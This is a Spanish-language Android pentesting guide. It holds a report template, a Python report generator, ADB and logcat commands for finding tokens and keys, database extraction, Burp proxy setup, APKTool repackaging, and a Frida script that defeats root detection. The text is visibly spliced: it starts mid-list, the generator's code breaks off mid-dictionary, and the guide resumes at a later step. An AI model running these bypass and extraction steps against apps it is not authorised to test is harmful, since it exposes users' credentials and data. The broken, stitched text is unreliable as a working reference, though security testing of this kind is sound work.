  - APKTool
  - Frida (Dynamic Instrumentation)
  - Burp Suite Professional
  - Android Studio + ADB

## Resumen Ejecutivo

### Nivel de Riesgo General: [CRÍTICO/ALTO/MEDIO/BAJO]

**Vulnerabilidades por severidad:**
- Críticas: [X]
- Altas: [X]
- Medias: [X]
- Bajas: [X]

### Principales Hallazgos

1. **[Vulnerabilidad Crítica 1]**
   - **Descripción:** [Descripción técnica]
   - **Impacto:** [Impacto en el negocio]
   - **CVSS Score:** [Puntuación]

2. **[Vulnerabilidad Crítica 2]**
   - **Descripción:** [Descripción técnica]
   - **Impacto:** [Impacto en el negocio]
   - **CVSS Score:** [Puntuación]

## Análisis Técnico Detallado

### 1. Análisis de Permisos

**Permisos solicitados por la aplicación:**
```xml
[Lista de permisos extraídos del AndroidManifest.xml]
```

**Permisos críticos identificados:**
- [Lista de permisos peligrosos con justificación]

### 2. Análisis de Superficie de Ataque

**Componentes exportados:**
- Activities: [X]
- Services: [X] 
- Broadcast Receivers: [X]
- Content Providers: [X]

### 3. Vulnerabilidades Identificadas

#### CRÍTICO - [Nombre de Vulnerabilidad]

**Descripción:**
[Descripción detallada de la vulnerabilidad]

**Evidencia:**
```java
// Código vulnerable encontrado
[Fragmento de código vulnerable]
```

**Pasos para reproducir:**
1. [Paso 1]
2. [Paso 2]
3. [Paso 3]

**Impacto:**
[Descripción del impacto]

**Recomendación:**
[Solución específica]

**Referencias:**
- OWASP Top 10 Mobile: [Categoría]
- CWE: [Número CWE]

#### ALTO - [Nombre de Vulnerabilidad]

[Seguir mismo formato]

### 4. Análisis de Comunicaciones

**Endpoints identificados:**
- [Lista de URLs encontradas]

**Protocolos utilizados:**
- HTTP: [X] (Inseguro)
- HTTPS: [X]

**Certificate Pinning:**
- Implementado: [SÍ/NO]
- Bypasseable: [SÍ/NO]

### 5. Análisis Criptográfico

**Algoritmos identificados:**
- [Lista de algoritmos de cifrado utilizados]

**Vulnerabilidades criptográficas:**
- [Lista de debilidades encontradas]

## Recomendaciones

### Inmediatas (Críticas)
1. [Recomendación 1]
2. [Recomendación 2]

### Corto Plazo (Altas)
1. [Recomendación 1]
2. [Recomendación 2]

### Medio Plazo (Medias)
1. [Recomendación 1]
2. [Recomendación 2]

## Anexos

### Anexo A: Lista Completa de Vulnerabilidades
[Tabla detallada con todas las vulnerabilidades]

### Anexo B: Evidencias Técnicas
[Screenshots, logs, fragmentos de código]

### Anexo C: Scripts Utilizados
[Scripts de Frida, comandos ADB, etc.]
```

### Script Generador de Reportes

```python
#!/usr/bin/env python3
# report_generator.py

import json
import datetime
from jinja2 import Template

class ReportGenerator:
    def __init__(self, analysis_data):
        self.data = analysis_data
        self.template = self.load_template()
    
    def load_template(self):
        """Cargar template de reporte"""
        template_str = """
# Reporte de Pentesting Móvil - {{ app_name }}

## Información General
- **Fecha:** {{ date }}
- **Package:** {{ package_name }}
- **Versión:** {{ version }}

## Resumen de Vulnerabilidades

{% for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'] %}
### {{ severity }}
{% for vuln in vulnerabilities if vuln.severity == severity %}
- **{{ vuln.title }}**
  - Archivo: `{{ vuln.file }}`
  - Descripción: {{ vuln.description }}
  - Impacto: {{ vuln.impact }}
{% endfor %}
{% endfor %}

## Análisis de Permisos

### Permisos Peligrosos
{% for perm in dangerous_permissions %}
- {{ perm }}
{% endfor %}

## Endpoints Identificados
{% for url in extracted_urls %}
- {{ url }}
{% endfor %}

## Recomendaciones

{% for rec in recommendations %}
{{ loop.index }}. **{{ rec.title }}**
   - Severidad: {{ rec.severity }}
   - Descripción: {{ rec.description }}
   - Implementación: {{ rec.implementation }}
{% endfor %}
        """
        return Template(template_str)
    
    def generate_report(self, output_file):
        """Generar reporte final"""
        report_data = {
            'app_name': self.data.get('app_name', 'Unknown'),
            'package_name': self.data.get('package_name', 'Unknown'),
            'version': self.data.get('version', 'Unknown'),
            'date': datetime.datetime.now().strftime('%d/%m/%Y %H:%M'),
            'vulnerabilities': self.data.get('vulnerabilities', []),
            'dangerous_permissions': self.data.get('dangerous_permissions', []),
            'extracted_urls': self.data.get('extracted_urls', []),
            'recommendations': self.data.get('recommendations', [])
        }
        
        report_content = self.template.render(**report_data)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"[+] Reporte generado: {output_file}")

# Uso
sample_data = {
    'app_name': 'Target Mobile App',
    'package_name': 'com.target.app',
    '

**Revisar AndroidManifest.xml:**
```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
```

**Permisos críticos a verificar:**
- Acceso a internet
- Ubicación GPS
- Cámara y micrófono
- Contactos
- Almacenamiento externo
- Bluetooth y WiFi

### Paso 3: Ingeniería Inversa del Código

**Herramienta recomendada: JD-GUI**

1. Abrir archivo `classes.dex` con JD-GUI
2. Analizar código fuente Java descompilado
3. Buscar:
   - Tokens y llaves de API
   - Funciones de autenticación
   - Llamadas a servicios externos
   - Manejo de datos sensibles

### Paso 4: Configuración del Entorno de Análisis

**Instalación de Android Studio:**
```bash
# Descargar Android Studio desde developer.android.com
# Configurar emulador con versión Android objetivo
# Instalar aplicación en emulador
```

**Configuración de ADB (Android Debug Bridge):**
```bash
adb devices  # Listar dispositivos conectados
adb shell    # Acceder al shell del dispositivo
adb install app.apk  # Instalar aplicación
```

### Paso 5: Análisis de Logs en Tiempo Real

**Comando para monitorear logs:**
```bash
adb logcat | grep "nombre_aplicacion"
```

**Información crítica en logs:**
- URLs de conexión (HTTP vs HTTPS)
- Tokens de autenticación
- Llaves de cifrado
- Rutas de acceso
- Errores de depuración

### Paso 6: Análisis del Sistema de Archivos

**Acceso a carpetas de la aplicación:**
```bash
adb shell
cd /data/data/com.nombre.aplicacion/
ls -la
```

**Carpetas importantes a revisar:**
- `/databases/` - Bases de datos SQLite
- `/shared_prefs/` - Preferencias compartidas
- `/cache/` - Archivos temporales
- `/files/` - Archivos de la aplicación

### Paso 7: Extracción y Análisis de Bases de Datos

```bash
# Extraer base de datos
adb pull /data/data/com.app.name/databases/database.db

# Analizar con SQLite browser
sqlite3 database.db
.tables
.schema table_name
SELECT * FROM table_name;
```

### Paso 8: Análisis de Tráfico de Red

**Configuración de Burp Suite:**
1. Generar certificado CA de Burp Suite
2. Instalar certificado en dispositivo Android
3. Configurar proxy en configuración WiFi:
   - IP: Dirección de la máquina con Burp Suite
   - Puerto: 8080 (por defecto)

**Alternativa con Wireshark:**
```bash
# Identificar interfaz del emulador
adb shell netstat
# Capturar tráfico específico del dispositivo
```

---

## Vulnerabilidades Comunes

### 1. Detección de Root/Emulador Insuficiente
- Aplicaciones críticas (bancarias) no deberían ejecutarse en dispositivos rooteados
- Implementar librerías de detección de root
- Verificar ejecución en emuladores

### 2. Almacenamiento Inseguro
- Datos sensibles en texto plano
- Tokens almacenados sin cifrado
- Información en logs de depuración

### 3. Comunicación Insegura
- Uso de HTTP en lugar de HTTPS
- Certificados SSL no validados
- Datos sensibles en logs de red

### 4. Permisos Excesivos
- Aplicaciones solicitando permisos innecesarios
- Acceso a contactos, cámara, micrófono sin justificación
- Permisos de administrador del dispositivo

---

## Bypass de Controles de Seguridad

### Usando Frida para Hooking

**Instalación de Frida:**
```bash
pip install frida-tools
```

**Script básico de bypass de detección de root:**
```javascript
Java.perform(function() {
    var RootDetection = Java.use("com.app.security.RootDetection");
    RootDetection.isDeviceRooted.implementation = function() {
        console.log("Bypass: Root detection called");
        return false;
    };
});
```

**Ejecutar script:**
```bash
frida -U -f com.target.app -l bypass_script.js
```

---

## Herramientas Adicionales

### APKTool
```bash
# Descompilar APK
apktool d app.apk

# Recompilar APK modificada
apktool b app_modificada/
```

### Análisis de Certificados
```bash
# Extraer certificado de APK
unzip app.apk META-INF/CERT.RSA
openssl pkcs7 -inform DER -in META-INF/CERT.RSA -print_certs -text
```

---

## Estándares de Seguridad

### OWASP Mobile Security Testing Guide (MSTG)
- Versión actual: 1.04
- Requerimientos de seguridad específicos
- Guía para verificación de controles de seguridad
- Metodología estándar de la industria

---

## Consideraciones Especiales

### Aplicaciones Financieras
- Tiempo de análisis: 3 semanas a 1 mes
- Verificación exhaustiva de comunicaciones
- Análisis de librerías de criptografía
- Implementación de controles anti-fraude

### Aplicaciones Regulares
- Tiempo de análisis: 1-2 semanas
- Enfoque en vulnerabilidades básicas
- Verificación de permisos estándar

---

## Medidas de Protección Recomendadas

### Para Desarrolladores
1. Implementar detección de dispositivos rooteados
2. Ofuscar código fuente crítico
3. Usar cifrado para datos sensibles
4. Validar certificados SSL/TLS
5. Implementar certificate pinning
6. Deshabilitar logs de depuración en producción

### Librerías de Seguridad
- Detección de root
- Verificación de emuladores
- Protección contra hooking
- Disponibles en GitHub como código abierto

---

## Comandos de Referencia Rápida

```bash
# Instalación de aplicación
adb install app.apk

# Extracción de APK instalada
adb shell pm path com.package.name
adb pull /path/to/app.apk

# Monitoreo de logs
adb logcat | grep "TAG"

# Acceso al shell del dispositivo
adb shell

# Listado de aplicaciones instaladas
adb shell pm list packages

# Información de aplicación específica
adb shell dumpsys package com.package.name
```

---

## Notas Importantes

- El análisis dinámico siempre produce mejores resultados que el estático
- Dispositivos rooteados son más vulnerables pero necesarios para análisis completo
- Aplicaciones en dispositivos rooteados pueden ser suplantadas más fácilmente
- Es legal analizar aplicaciones instaladas en dispositivos propios
- La seguridad debe implementarse desde el diseño (security by design)
- Una vez en Play Store, se pierde control sobre la aplicación
